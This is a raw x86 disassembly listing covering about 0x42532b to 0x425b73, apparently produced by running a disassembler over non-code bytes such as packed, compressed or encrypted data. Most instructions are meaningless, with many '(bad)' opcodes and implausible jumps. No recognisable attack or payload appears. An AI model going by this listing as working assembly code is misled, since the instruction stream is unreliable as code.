  42532b:	xchg   BYTE PTR [eax],al
  42532d:	lahf   
  42532e:	ret    0x8735
  425331:	jmp    0x2df3:0x6200053e
  425338:	call   0xfbdaa605
  42533d:	fiadd  WORD PTR [edx-0x492241f6]
  425343:	ficom  DWORD PTR [ebx]
  425345:	jmp    0xbb0dde9d
  42534a:	nop
  42534b:	fwait
  42534c:	sti    
  42534d:	lds    eax,FWORD PTR [edx+0x12]
  425350:	and    al,0x56
  425352:	rcl    DWORD PTR [ecx],0x20
  425355:	call   0xa2c658da
  42535a:	jbe    0x425359
  42535c:	xchg   BYTE PTR [edi],dl
  42535e:	ret    0xc898
  425361:	xor    DWORD PTR [edi+0x522dc050],edi
  425367:	mov    DWORD PTR [edx+0x66],eax
  42536a:	jb     0x425373
  42536c:	mov    dl,0x1c
  42536e:	ret    
  42536f:	cs call 0x409582
  425375:	mov    dl,0xc1
  425377:	aaa    
  425378:	pop    edx
  425379:	(bad)  
  42537b:	les    eax,FWORD PTR [edx+eiz*2]
  42537e:	inc    ecx
  42537f:	mov    ds:0xfec261bc,al
  425384:	dec    esi
  425385:	scas   eax,DWORD PTR es:[edi]
  425386:	push   eax
  425387:	lea    ecx,[esi+eax*4-0x27]
  42538b:	or     esi,DWORD PTR [ecx]
  42538d:	xlat   BYTE PTR ds:[ebx]
  42538e:	and    al,0x4
  425390:	lock add BYTE PTR [ebp-0x7c],al
  425394:	and    eax,0xd0646203
  425399:	mov    ebp,DWORD PTR [esi+0x297ed7fd]
  42539f:	call   0xb85ef207
  4253a4:	call   0xd43fda35
  4253a9:	jle    0x4253aa
  4253ab:	out    0x6b,eax
  4253ad:	mov    eax,ds:0x8ce8b804
  4253b2:	das    
  4253b3:	rcr    DWORD PTR ds:0x60d962cd,0x40
  4253ba:	inc    esi
  4253bb:	shr    DWORD PTR [esp+eax*8+0x59],1
  4253bf:	pop    ebp
  4253c0:	xchg   esp,eax
  4253c1:	push   es
  4253c2:	(bad)  
  4253c3:	fnstenv [esi+0x61abddbc]
  4253c9:	adc    BYTE PTR [esi+0x639766cd],al
  4253cf:	das    
  4253d0:	test   al,0x86
  4253d2:	cs std 
  4253d4:	lahf   
  4253d5:	stos   DWORD PTR es:[edi],eax
  4253d6:	loope  0x4253f7
  4253d8:	jmp    0xbcdb39e0
  4253dd:	aam    0xde
  4253df:	lds    esi,FWORD PTR [eax+ebp*8+0x2de3a01c]
  4253e6:	outs   dx,BYTE PTR ds:[esi]
  4253e7:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253e9:	fild   QWORD PTR [ecx]
  4253eb:	adc    BYTE PTR [eax-0xdc69068],bh
  4253f1:	inc    ebx
  4253f2:	bound  ebx,QWORD PTR [esp+ebp*1+0x8]
  4253f6:	add    bh,bl
  4253f8:	cwde   
  4253f9:	xchg   esp,eax
  4253fa:	or     BYTE PTR [eax],ah
  4253fc:	pop    edx
  4253fd:	sub    edi,DWORD PTR [ebp-0x2318269d]
  425403:	push   esi
  425404:	sub    al,0x1
  425406:	or     edi,esp
  425408:	(bad)  
  425409:	out    0xe5,al
  42540b:	fsubr  DWORD PTR ds:0x35d6fd25
  425411:	and    eax,0xcd4176f9
  425416:	jmp    0xbb712d7c
  42541b:	in     al,0x25
  42541d:	and    eax,0x6ddaf63d
  425422:	jmp    0x4447b888
  425427:	pop    esi
  425428:	fld    DWORD PTR [eax]
  42542a:	jmp    0x14677252
  42542f:	bound  esp,QWORD PTR [ebp+ecx*1-0x17]
  425433:	out    dx,al
  425434:	jbe    0x4253be
  425436:	sub    eax,0xa083d302
  42543b:	pop    edx
  42543c:	pop    ebp
  42543d:	ds jmp 0x4254a1
  425440:	fscale 
  425442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425443:	mov    dh,0xa4
  425445:	bnd jl 0x4253f6
  425448:	jbe    0x4254b1
  42544a:	out    0x83,eax
  42544c:	pusha  
  42544d:	inc    ebp
  42544e:	or     eax,0x5b8611ae
  425453:	mov    BYTE PTR [ebx-0x269e172a],ch
  425459:	std    
  42545a:	push   ebp
  42545b:	add    ah,ah
  42545d:	xor    eax,0x7ecf1725
  425462:	arpl   WORD PTR [edx+0xe4b6a6a],dx
  425468:	jmp    0x4047797a
  42546d:	pop    esp
  42546e:	enter  0xa59c,0x38
  425472:	cmp    BYTE PTR [edi+0x621b2d98],bh
  425478:	dec    ebp
  425479:	std    
  42547a:	sbb    cl,dl
  42547c:	jne    0x42546a
  42547e:	or     DWORD PTR [eax],eax
  425480:	div    BYTE PTR [ecx]
  425482:	add    BYTE PTR [eax],al
  425484:	dec    ebx
  425485:	pop    edi
  425486:	inc    edi
  425487:	jne    0x63438943
  42548d:	in     al,0xfc
  42548f:	(bad)  
  425490:	cmp    al,0x84
  425492:	jle    0x425495
  425494:	dec    ebx
  425495:	fiadd  DWORD PTR [ecx+0x2bb16744]
  42549b:	ror    BYTE PTR [esi+0x3b006d91],cl
  4254a1:	fiadd  DWORD PTR [eax]
  4254a3:	not    esp
  4254a5:	xchg   ecx,eax
  4254a6:	aad    0x73
  4254a8:	pop    edi
  4254a9:	xlat   BYTE PTR ds:[ebx]
  4254aa:	or     ecx,0x2c
  4254ad:	bound  eax,QWORD PTR ss:[ecx]
  4254b0:	sti    
  4254b1:	fldenv [edx+0x2]
  4254b4:	mov    ds:0x274487d7,eax
  4254b9:	mov    esi,0x96458b60
  4254be:	pop    es
  4254bf:	mov    dh,0x0
  4254c1:	sub    eax,0xebc160c5
  4254c6:	in     al,0x5e
  4254c8:	or     eax,DWORD PTR [ebx]
  4254ca:	pusha  
  4254cb:	aas    
  4254cc:	and    esp,DWORD PTR [ecx-0x27]
  4254cf:	push   eax
  4254d0:	(bad)  
  4254d1:	not    DWORD PTR [ebp-0x28af14ce]
  4254d7:	aaa    
  4254d8:	pop    esi
  4254d9:	push   edx
  4254da:	fiadd  WORD PTR [esi+edi*1+0x6a00d9ba]
  4254e1:	test   cl,dh
  4254e3:	pop    esi
  4254e4:	mov    edi,eax
  4254e6:	xchg   ebp,eax
  4254e7:	es data16 add bh,dh
  4254eb:	aaa    
  4254ec:	unpckhps xmm3,XMMWORD PTR [edi]
  4254ef:	xor    esp,DWORD PTR [esi+0x3a]
  4254f2:	jge    0x4254fd
  4254f4:	data16 jo 0x425498
  4254f7:	mov    WORD PTR [esi+0x62],es
  4254fa:	cdq    
  4254fb:	sub    BYTE PTR [eax],dl
  4254fd:	adc    dl,BYTE PTR ds:0x50262441
  425503:	sbb    al,0x89
  425505:	scas   al,BYTE PTR es:[edi]
  425506:	sahf   
  425507:	fdivr  st,st(2)
  425509:	outs   dx,DWORD PTR ds:[esi]
  42550a:	dec    esi
  42550b:	in     al,dx
  42550c:	aas    
  42550d:	bound  edx,QWORD PTR [ebx-0x581b3b5]
  425513:	jge    0x4254d9
  425515:	outs   dx,BYTE PTR ds:[esi]
  425516:	or     BYTE PTR [eax+ebp*8],al
  425519:	add    DWORD PTR [edi-0x2],esi
  42551c:	call   FWORD PTR [ebp+0x4c]
  42551f:	mov    esi,0xda2ed750
  425524:	lahf   
  425525:	add    BYTE PTR [edx-0x3e],ah
  425528:	(bad)  
  425529:	out    0x30,eax
  42552b:	sbb    DWORD PTR ds:0xe0d6d900,eax
  425531:	daa    
  425532:	js     0x4254f3
  425534:	xchg   ebx,eax
  425535:	xor    edi,ebp
  425537:	cld    
  425538:	add    DWORD PTR [eax-0x19],edx
  42553b:	fisub  DWORD PTR ds:[ebx-0x77013d9e]
  425542:	sahf   
  425543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425544:	loop   0x42552d
  425546:	test   edi,eax
  425548:	add    al,0x0
  42554a:	out    0x6,eax
  42554c:	loope  0x425579
  42554e:	int    0xee
  425550:	(bad)  
  425552:	popa   
  425553:	ret    0x8cfe
  425556:	out    dx,al
  425557:	fidivr WORD PTR [eax+0x0]
  42555a:	(bad)
  42555f:	ret    0x4ffe
  425562:	mov    edx,0x6200afe2
  425567:	ds mov esi,0x49eb2a74
  42556d:	and    al,0xb6
  42556f:	mov    edi,0xd9c5fffe
  425574:	xlat   BYTE PTR ds:[ebx]
  425575:	adc    BYTE PTR [edx-0x27],ah
  425578:	mov    dl,0x29
  42557a:	inc    esi
  42557b:	data16 lods al,BYTE PTR ds:[esi]
  42557d:	fcomip st,st(5)
  42557f:	or     BYTE PTR [ebp-0x79],bl
  425582:	ds sub eax,0x5fc16203
  425589:	mov    ebx,0x6bd96200
  42558e:	ret    
  42558f:	(bad)  
  425590:	std    
  425591:	jmp    0x6203:0xe78d7e4e
  425598:	pusha  
  425599:	ins    BYTE PTR es:[edi],dx
  42559a:	loopne 0x4255ad
  42559c:	fsub   st,st(7)
  42559e:	add    edx,DWORD PTR [ecx-0x317916a0]
  4255a4:	cld    
  4255a5:	xchg   DWORD PTR [edx+eiz*2],eax
  4255a8:	fst    DWORD PTR ds:0x6bddb295
  4255ae:	les    ebx,FWORD PTR [ecx+0x5e]
  4255b1:	pop    ecx
  4255b2:	add    al,0x62
  4255b4:	fldcw  WORD PTR [esi+0x18]
  4255b7:	inc    esi
  4255b8:	shr    DWORD PTR [esi+0x10],1
  4255bb:	ds std 
  4255bd:	iret   
  4255be:	imul   DWORD PTR [ebx]
  4255c0:	cs xor al,0xac
  4255c3:	pushf  
  4255c4:	popa   
  4255c5:	adc    BYTE PTR [ebp+0x48f498e6],0xa0
  4255cc:	fdiv   QWORD PTR [ecx-0x3bd31afe]
  4255d2:	jecxz  0x4255cb
  4255d4:	fldcw  WORD PTR [esi-0x3a]
  4255d7:	retf   0x5f27
  4255da:	xchg   ebp,eax
  4255db:	mov    ecx,0x25dfa465
  4255e0:	bound  ebp,QWORD PTR [edi+ebx*8+0x3f69c145]
  4255e7:	arpl   cx,bx
  4255e9:	arpl   sp,ax
  4255eb:	push   cs
  4255ec:	stc    
  4255ed:	add    bl,al
  4255ef:	add    BYTE PTR [ebp+0x64],bh
  4255f2:	inc    ebp
  4255f3:	add    eax,0x2651074a
  4255f8:	lea    edx,[ebx]
  4255fa:	adc    ebp,DWORD PTR [ecx-0x1a3acb9f]
  425600:	in     al,dx
  425601:	cwde   
  425602:	je     0x4255e6
  425604:	xor    bh,BYTE PTR [ebx]
  425606:	arpl   WORD PTR [edx+0x3ee91113],di
  42560c:	mov    eax,ds:0x9a6400d8
  425611:	std    
  425612:	and    BYTE PTR [ecx],al
  425614:	rcr    BYTE PTR [ecx],1
  425616:	add    cl,ch
  425618:	in     al,0x65
  42561a:	and    eax,0xd96181
  42561f:	rol    DWORD PTR [esi+0x3d],0x1
  425623:	jmp    0xe5677402
  425628:	in     al,0xcd
  42562a:	imul   ebp,ecx,0x61
  42562d:	fld    DWORD PTR [eax]
  42562f:	sub    ebp,esp
  425631:	in     eax,0xe
  425633:	pusha  
  425634:	inc    ebp
  425635:	std    
  425636:	sbb    al,0xe2
  425638:	and    BYTE PTR [ebx+0x4f],al
  42563b:	jb     0x42568a
  42563d:	std    
  42563e:	adc    BYTE PTR [edx+0x5d],ah
  425641:	std    
  425642:	adc    al,0x80
  425644:	arpl   WORD PTR [edi-0x681d7906],bp
  42564a:	or     bh,BYTE PTR [ebx-0x7e34a4ed]
  425650:	hlt    
  425651:	stos   DWORD PTR es:[edi],eax
  425652:	cli    
  425653:	outs   dx,BYTE PTR ds:[esi]
  425654:	add    BYTE PTR [ebx-0x3],bh
  425657:	mov    ebp,DWORD PTR [ebp-0x46b1e163]
  42565d:	into   
  42565e:	int3   
  42565f:	jmp    DWORD PTR fs:[ecx]
  425662:	fnstcw WORD PTR [ebp+0x25]
  425665:	pop    ebp
  425666:	fs inc ebp
  425668:	add    BYTE PTR [edi-0xb],ch
  42566b:	bound  edx,QWORD PTR [ebp*8-0x8ea0a1a]
  425672:	les    edi,FWORD PTR [edx]
  425674:	add    al,bh
  425676:	jno    0x425685
  425678:	lea    esi,[edi-0x6917bd6e]
  42567e:	repz (bad) 
  425680:	inc    DWORD PTR [esi]
  425682:	pop    edx
  425683:	and    eax,0xd67b98
  425688:	mov    bl,0x4a
  42568a:	jle    0x42564b
  42568c:	imul   ecx,DWORD PTR [ebx-0x2a],0xa61f4c81
  425693:	loop   0x425661
  425695:	adc    esi,0x0
  425698:	mov    esi,DWORD PTR [edi-0x3f]
  42569b:	adc    ch,al
  42569d:	or     BYTE PTR [ebp+0x1],dh
  4256a0:	add    cl,al
  4256a2:	call   0xb8e9:0x96c009e2
  4256a9:	rcr    esp,cl
  4256ab:	add    BYTE PTR [edx],dh
  4256ad:	retf   
  4256ae:	in     eax,0x56
  4256b0:	pop    ebp
  4256b1:	jo     0x42570f
  4256b3:	lds    edi,FWORD PTR [eax+edi*8+0xc200d5]
  4256ba:	repz aad 0x49
  4256bd:	push   esi
  4256be:	push   ecx
  4256bf:	fadd   QWORD PTR [ecx+0x115229d9]
  4256c5:	mov    ebp,DWORD PTR [eax+0x11e8c731]
  4256cb:	jnp    0x4256c3
  4256cd:	(bad)  
  4256ce:	aas    
  4256cf:	popf   
  4256d0:	jne    0x4256e1
  4256d2:	popa   
  4256d3:	fimul  DWORD PTR [esi-0x1]
  4256d6:	scas   al,BYTE PTR es:[edi]
  4256d7:	inc    ecx
  4256d8:	adc    eax,0xf132cb40
  4256dd:	test   DWORD PTR ds:0x625ee4d0,ecx
  4256e3:	addr16 ret 
  4256e5:	push   ebp
  4256e6:	fpatan 
  4256e8:	and    esp,0xca13e9a
  4256ee:	xor    DWORD PTR [edx+0x37],ecx
  4256f1:	sti    
  4256f2:	pop    ss
  4256f3:	mov    esp,0x6c85d67b
  4256f8:	test   BYTE PTR [esi+0x2431287b],0x5a
  4256ff:	sub    DWORD PTR [ecx],edx
  425701:	and    al,0x4e
  425703:	retf   
  425704:	not    DWORD PTR [ebx-0x79017fb2]
  42570a:	push   edx
  42570b:	ds xchg edi,eax
  42570d:	or     ebx,esi
  42570f:	cmp    BYTE PTR ds:0x57b76200,al
  425715:	dec    ebp
  425716:	push   esi
  425717:	or     eax,0xf26e2449
  42571c:	std    
  42571d:	mov    dl,0x0
  42571f:	lahf   
  425720:	stos   BYTE PTR es:[edi],al
  425721:	aaa    
  425722:	pushaw 
  425724:	and    DWORD PTR [ebp+0x357a5910],0x890a6266
  42572e:	add    BYTE PTR [edx-0x3e],ah
  425731:	cmp    bl,bh
  425733:	ja     0x4256d3
  425735:	repnz aas 
  425737:	bound  esi,QWORD PTR ds:0x936675be
  42573d:	cwde   
  42573e:	out    0x98,eax
  425740:	sub    eax,DWORD PTR [edx+0x24]
  425743:	pop    esi
  425744:	inc    ebx
  425745:	xchg   bl,bh
  425747:	outs   dx,DWORD PTR ds:[esi]
  425748:	sti    
  425749:	jns    0x425788
  42574b:	push   cs
  42574c:	(bad)  
  42574d:	add    BYTE PTR ds:[eax+0x32],cl
  425751:	cmp    BYTE PTR [edi+0xdb727ac],al
  425757:	(bad)  {k7}
  42575c:	fxch   st(5)
  42575e:	xchg   ebx,eax
  42575f:	adc    BYTE PTR [ebp+edx*1+0x6c],ah
  425763:	push   esi
  425764:	sbb    eax,ebp
  425766:	xchg   edx,eax
  425767:	nop
  425768:	fs mov ah,0xe7
  42576b:	ins    DWORD PTR es:[edi],dx
  42576c:	mov    al,0xbd
  42576e:	(bad)  
  42576f:	fcomp  QWORD PTR ds:0x2688ec04
  425775:	loopne 0x425712
  425777:	imul   BYTE PTR [edi+0x15eb922b]
  42577d:	int3   
  42577e:	idiv   edi
  425780:	test   al,0xb7
  425782:	xchg   edx,eax
  425783:	add    BYTE PTR [ecx+0x699212f6],dl
  425789:	test   al,0xb8
  42578b:	sbb    eax,0xb9030c52
  425790:	frstor [esp+eax*8]
  425793:	test   DWORD PTR [edi+edx*8+0x6c],0x60dbceae
  42579b:	push   es
  42579c:	cdq    
  42579d:	fs stos BYTE PTR es:[edi],al
  42579f:	xor    cl,BYTE PTR [ebp-0x13d03a9c]
  4257a5:	loopne 0x42578e
  4257a7:	fnstsw WORD PTR ss:[ecx+ebp*2-0x18259560]
  4257af:	add    ebp,DWORD PTR [ecx+0x68]
  4257b2:	adc    eax,0xd815e4fc
  4257b7:	ret    0xc902
  4257ba:	fidiv  WORD PTR [ebx+0x3770d9e5]
  4257c0:	push   0x64
  4257c2:	sub    al,dh
  4257c4:	and    bh,BYTE PTR [ecx+0x4315fce0]
  4257ca:	in     al,0x7e
  4257cc:	daa    
  4257cd:	loope  0x4257e6
  4257cf:	jg     0x4257b8
  4257d1:	mov    al,0x7a
  4257d3:	xchg   ecx,eax
  4257d4:	leave  
  4257d5:	popa   
  4257d6:	add    DWORD PTR [esi+eax*8],ebx
  4257d9:	call   0xe8fa:0xb3d07184
  4257e0:	popa   
  4257e1:	fld    DWORD PTR [eax]
  4257e3:	push   ecx
  4257e4:	adc    DWORD PTR [edx+0x250056fb],ecx
  4257ea:	pop    esi
  4257eb:	stc    
  4257ec:	dec    edi
  4257ed:	repz mov bl,0xfa
  4257f0:	mov    esp,0xd974b28d
  4257f5:	repnz and eax,0x9d92410d
  4257fb:	sti    
  4257fc:	cs mov ecx,0x2ce9116e
  425802:	pop    eax
  425803:	in     eax,dx
  425804:	push   0xffffffba
  425806:	mov    al,0x50
  425808:	push   0x55
  42580a:	loope  0x42580c
  42580c:	mov    edx,0x20860a9b
  425811:	jp     0x425820
  425813:	xchg   BYTE PTR [ebp+edx*2+0x5a],dh
  425817:	sti    
  425818:	sub    ebx,esi
  42581a:	push   edx
  42581b:	add    DWORD PTR [esi+0x70],esi
  42581e:	push   esi
  42581f:	(bad)  
  425820:	jae    0x42589d
  425822:	leave  
  425823:	test   DWORD PTR [ecx],ebp
  425825:	sub    dh,BYTE PTR [eax-0x64213e36]
  42582b:	add    ecx,ebp
  42582d:	in     eax,0x99
  42582f:	jne    0x425838
  425831:	xchg   edi,eax
  425832:	scas   al,BYTE PTR es:[edi]
  425833:	xchg   DWORD PTR [ecx+0xa],eax
  425836:	mov    al,0xf2
  425838:	fs call 0xf355:0xfe3687c9
  425840:	sbb    eax,0x9e530963
  425845:	push   esp
  425846:	leave  
  425847:	test   DWORD PTR [edx-0x7ef6db2e],esp
  42584d:	add    BYTE PTR [ecx-0x23ff054e],cl
  425853:	sub    eax,0xe1520844
  425858:	add    DWORD PTR [edi-0x3d],0xcb043ea1
  42585f:	(bad)  
  425861:	push   DWORD PTR [edx]
  425863:	ror    DWORD PTR [ebx+ecx*4],1
  425866:	mov    al,0x55
  425868:	rcl    DWORD PTR [eax],0xba
  42586b:	sbb    edx,DWORD PTR ds:0xfb4d8ab0
  425871:	xor    DWORD PTR [ebx-0x17],ecx
  425874:	push   esi
  425875:	pop    ebx
  425876:	adc    BYTE PTR [edi+0x5c],dh
  425879:	ret    0xdaab
  42587c:	push   ebx
  42587d:	mov    edi,DWORD PTR [edi]
  42587f:	push   ebp
  425880:	in     eax,dx
  425881:	or     al,0xb8
  425883:	lock cmc 
  425885:	jne    0x4258f2
  425887:	sub    eax,0x2f3033f0
  42588c:	dec    esp
  42588d:	hlt    
  42588e:	ret    0xf4ff
  425891:	mov    esi,edi
  425893:	pop    ebp
  425894:	jmp    0xf68b123d
  425899:	test   BYTE PTR [ebx-0x3a],bh
  42589c:	or     edi,edi
  42589e:	mov    dh,0x5e
  4258a0:	div    BYTE PTR [ebp+0x17]
  4258a3:	in     al,0xf5
  4258a5:	jne    0x4258da
  4258a7:	xor    eax,edi
  4258a9:	call   0x38b714
  4258ae:	cmp    DWORD PTR [ebp-0x7e],0x4cd7004d
  4258b5:	mov    ah,0xc6
  4258b7:	sti    
  4258b8:	fst    DWORD PTR [esi-0x76]
  4258bb:	mov    eax,0x1fc2c801
  4258c0:	fiadd  DWORD PTR [ecx-0x7c29d8ac]
  4258c6:	rcl    BYTE PTR [esi-0x5c],cl
  4258c9:	add    DWORD PTR [ecx],0x62
  4258cc:	inc    ebx
  4258cd:	or     eax,0x8d32214
  4258d2:	das    
  4258d3:	mov    ds:0xa27ed74a,al
  4258d8:	outs   dx,DWORD PTR ds:[esi]
  4258d9:	xchg   edi,eax
  4258da:	or     cl,bl
  4258dc:	add    ebp,edi
  4258de:	jle    0x425882
  4258e0:	(bad)  
  4258e1:	(bad)  
  4258e2:	mov    ebp,0xd077a8e9
  4258e7:	jns    0x4258da
  4258e9:	xor    al,BYTE PTR [edi-0x418053cd]
  4258ef:	jb     0x4258bc
  4258f1:	mov    dl,0x73
  4258f3:	imul   ebp,DWORD PTR [ebx],0x3d
  4258f6:	or     BYTE PTR [ecx-0x16],ah
  4258f9:	(bad)
  4258fc:	ret    0xbfcf
  4258ff:	sbb    al,0x2
  425901:	or     DWORD PTR [eax],eax
  425903:	or     al,0x6f
  425905:	sbb    BYTE PTR [eax],al
  425907:	fnop   
  425909:	pushf  
  42590a:	mov    ah,0x65
  42590c:	(bad)  
  42590d:	mov    DWORD PTR [edi+0x74af3632],eax
  425913:	jle    0x42593c
  425915:	adc    DWORD PTR [eax+eax*1],esp
  425918:	pop    esi
  425919:	cdq    
  42591a:	enter  0x5474,0x37
  42591e:	aas    
  42591f:	add    al,0x87
  425921:	ret    0xfffe
  425924:	mov    dl,0xf9
  425926:	dec    eax
  425927:	and    al,0x52
  425929:	push   es
  42592a:	clc    
  42592b:	dec    ebp
  42592c:	fnstenv [esi+edx*4-0x70]
  425930:	sbb    eax,0x32878b9c
  425935:	ds mov al,0x75
  425938:	add    dh,BYTE PTR [eax-0x7f5ba442]
  42593e:	idiv   bh
  425940:	call   0x9435f0c5
  425945:	fnstcw WORD PTR [eax]
  425947:	xor    edx,DWORD PTR [edi+0x667b3303]
  42594d:	cmc    
  42594e:	repz jp 0x42591c
  425951:	pusha  
  425952:	sbb    eax,DWORD PTR [eax]
  425954:	jmp    0x425993
  425956:	int3   
  425957:	mul    esi
  425959:	mov    ds:0x9a451af4,al
  42595e:	out    0x9b,al
  425960:	mov    al,0x96
  425962:	call   0x6dd4366a
  425967:	stos   BYTE PTR es:[edi],al
  425968:	ss push cs
  42596a:	push   edx
  42596b:	inc    esi
  42596c:	pop    esi
  42596d:	fisub  DWORD PTR [esi+edx*1+0x72]
  425971:	and    eax,0xe1297aa5
  425976:	dec    edi
  425977:	scas   al,BYTE PTR es:[edi]
  425978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425979:	(bad)  
  42597b:	jp     0x42597d
  42597d:	jp     0x4259d5
  42597f:	inc    ebp
  425980:	pop    ss
  425981:	cmp    DWORD PTR [eax-0x64],esp
  425984:	out    0x51,eax
  425986:	push   es
  425987:	and    edx,DWORD PTR [esi]
  425989:	pop    edx
  42598a:	add    ebx,DWORD PTR [ebx]
  42598c:	(bad)  
  42598d:	jge    0x42595a
  42598f:	adc    DWORD PTR [esi-0x5c9fa7],ecx
  425995:	jmp    0xc414:0xdeefcc14
  42599c:	out    dx,eax
  42599d:	xchg   ebp,eax
  42599e:	or     bl,dh
  4259a0:	adc    eax,0x9b15606a
  4259a5:	mov    ds:0xe58de36c,al
  4259aa:	popf   
  4259ab:	outs   dx,DWORD PTR ds:[esi]
  4259ac:	xchg   esp,eax
  4259ad:	cmp    bl,BYTE PTR [ecx+0x586204ad]
  4259b3:	retf   0x8f03
  4259b6:	(bad)  
  4259b8:	out    0xe4,al
  4259ba:	adc    esi,eax
  4259bc:	retf   0xdda0
  4259bf:	add    BYTE PTR ds:0xc1c652f0,bh
  4259c5:	cwde   
  4259c6:	xchg   esi,eax
  4259c7:	add    ecx,ebp
  4259c9:	adc    ch,BYTE PTR [edx+ebx*2+0x3f]
  4259cd:	xor    eax,0xa0305804
  4259d2:	aam    0x0
  4259d4:	cmp    cl,BYTE PTR [esi+0x4abefa07]
  4259da:	sahf   
  4259db:	jmp    0xfaf22f78
  4259e0:	bound  eax,QWORD PTR [eax]
  4259e2:	daa    
  4259e3:	ffree  st(2)
  4259e5:	in     eax,0x62
  4259e7:	fld    DWORD PTR [ebp+0x4599adae]
  4259ed:	jmp    0x90fb:0x2a85d960
  4259f4:	push   eax
  4259f5:	mov    edx,0xbdfa084f
  4259fa:	test   ebx,eax
  4259fc:	test   DWORD PTR [eax],esp
  4259fe:	xlat   BYTE PTR ds:[ebx]
  4259ff:	and    al,0x25
  425a01:	rcl    DWORD PTR [edx-0x1bd11657],1
  425a07:	scas   eax,DWORD PTR es:[edi]
  425a08:	cli    
  425a09:	jb     0x4259e9
  425a0b:	push   ebp
  425a0c:	cli    
  425a0d:	xchg   ebp,eax
  425a0e:	jp     0x425a16
  425a10:	xchg   BYTE PTR [edx],ah
  425a12:	(bad)  
  425a13:	call   0x53296911
  425a18:	icebp  
  425a19:	ins    BYTE PTR es:[edi],dx
  425a1a:	hlt    
  425a1b:	and    eax,0xf58a720c
  425a20:	sbb    al,0x6c
  425a22:	lock and eax,0xdd776204
  425a28:	xchg   ebx,esi
  425a2a:	jle    0x425a7e
  425a2c:	ret    
  425a2d:	aas    
  425a2e:	jnp    0x425a40
  425a30:	mov    edi,0xed5861e5
  425a35:	stc    
  425a36:	pusha  
  425a37:	fld    DWORD PTR [eax]
  425a39:	add    BYTE PTR [eax-0x1e],ch
  425a3c:	dec    esi
  425a3d:	xor    edx,DWORD PTR [esi]
  425a3f:	inc    ebp
  425a40:	test   DWORD PTR [ebx+ebp*2],esp
  425a43:	(bad)  
  425a44:	add    BYTE PTR [eax],al
  425a46:	add    BYTE PTR [edx],cl
  425a48:	out    0x81,al
  425a4a:	(bad)  [edi-0x20]
  425a4d:	push   ebx
  425a4e:	jmp    0x425aa6
  425a50:	sahf   
  425a51:	sub    BYTE PTR [edi+ebp*2+0x30],dh
  425a55:	ja     0x425a5b
  425a57:	in     al,dx
  425a58:	xchg   ebp,eax
  425a59:	add    DWORD PTR [eax],eax
  425a5b:	xlat   BYTE PTR ds:[ebx]
  425a5c:	(bad)  
  425a5d:	jae    0x425ab8
  425a5f:	cmp    dh,BYTE PTR [ebp-0xa]
  425a62:	(bad)  
  425a63:	cmp    ebx,DWORD PTR [ebp-0x78]
  425a66:	jle    0x425a27
  425a68:	push   edi
  425a69:	fiadd  WORD PTR [eax]
  425a6b:	mov    ebx,0x105670d6
  425a70:	mov    esp,0xab700a83
  425a75:	jne    0x425a8e
  425a77:	add    BYTE PTR [eax],bl
  425a79:	add    eax,0xd67b25
  425a7e:	jo     0x425ae0
  425a80:	xchg   esp,eax
  425a81:	je     0x425a8e
  425a83:	cmp    al,0x18
  425a85:	add    eax,0xfaac8b00
  425a8a:	je     0x425af5
  425a8c:	das    
  425a8d:	and    edx,DWORD PTR [edx-0x10]
  425a90:	jo     0x425a7b
  425a92:	xor    esi,DWORD PTR [ebp+0x5d]
  425a95:	test   BYTE PTR [ebx+0x75cb539b],0x6e
  425a9c:	push   ecx
  425a9d:	sbb    eax,0x3b311589
  425aa2:	add    al,0xa2
  425aa4:	(bad)  
  425aa5:	add    BYTE PTR [eax],cl
  425aa7:	dec    ebx
  425aa8:	ret    0x8904
  425aab:	add    BYTE PTR [ecx+0x4a],dl
  425aae:	or     eax,0xf15e0425
  425ab3:	jmp    DWORD PTR [edx+0x39]
  425ab6:	inc    ebx
  425ab7:	add    al,0x9
  425ab9:	mov    esi,0x27b42a7d
  425abe:	mov    edx,0x866a5de8
  425ac3:	sti    
  425ac4:	jmp    0x7034db38
  425ac9:	cmp    BYTE PTR [ebx],bl
  425acb:	xor    al,0x78
  425acd:	test   al,0x87
  425acf:	xor    eax,0x40cb9a
  425ad4:	(bad)  [edx+eax*4+0x7bc02210]
  425adb:	lock fld TBYTE PTR [ebx+0x21df13da]
  425ae2:	test   BYTE PTR [ebx-0x13e91],0x9d
  425ae9:	icebp  
  425aea:	lock das 
  425aec:	(bad)  
  425aed:	sar    dh,0x86
  425af0:	popa   
  425af1:	gs jnp 0x425b34
  425af4:	jp     0x425b2f
  425af6:	aas    
  425af7:	sbb    cl,ch
  425af9:	mov    esi,0x296e407b
  425afe:	aas    
  425aff:	sbb    al,0x79
  425b01:	dec    edx
  425b02:	int    0x2a
  425b04:	test   BYTE PTR [ebp+0x7b],0x6b
  425b08:	push   0x37
  425b0a:	das    
  425b0b:	adc    al,0xe1
  425b0d:	cld    
  425b0e:	hlt    
  425b0f:	inc    BYTE PTR [eax]
  425b11:	mov    ?,WORD PTR [ecx+edi*1]
  425b14:	and    al,0x76
  425b16:	fisub  DWORD PTR [ecx-0x41]
  425b19:	bound  esi,QWORD PTR [edx-0x79798b85]
  425b1f:	jp     0x425ae1
  425b21:	push   ebp
  425b22:	ds mov ebp,0x7bb26200
  425b28:	dec    edx
  425b29:	dec    esi
  425b2a:	cmp    edi,esi
  425b2c:	(bad)  
  425b2d:	pop    ds
  425b2e:	fidiv  DWORD PTR [eax+0x4]
  425b31:	frstor [eax]
  425b33:	in     al,0x7c
  425b35:	mov    ds:0x6a425edd,eax
  425b3a:	push   edx
  425b3b:	sub    esp,edi
  425b3d:	mov    WORD PTR [edx],fs
  425b3f:	lock add ebx,ebp
  425b42:	and    ah,ch
  425b44:	jl     0x425ae9
  425b46:	aad    0x39
  425b48:	lock clc 
  425b4a:	sub    ah,al
  425b4c:	js     0x425aef
  425b4e:	leave  
  425b4f:	aaa    
  425b50:	jns    0x425af5
  425b52:	leave  
  425b53:	aaa    
  425b54:	mov    esi,DWORD PTR [edi+0x5]
  425b57:	cli    
  425b58:	inc    ebx
  425b59:	bound  ebx,QWORD PTR [esp+eiz*4-0x9]
  425b5d:	bound  esi,QWORD PTR [edi]
  425b5f:	(bad)  
  425b61:	mov    dh,0x10
  425b63:	outs   dx,DWORD PTR ds:[esi]
  425b64:	mov    esi,0x8a753cca
  425b69:	mov    ecx,0xa9807054
  425b6e:	cs jl  0x425bef
  425b71:	and    ch,cl
  425b73:	sbb    al,0x4
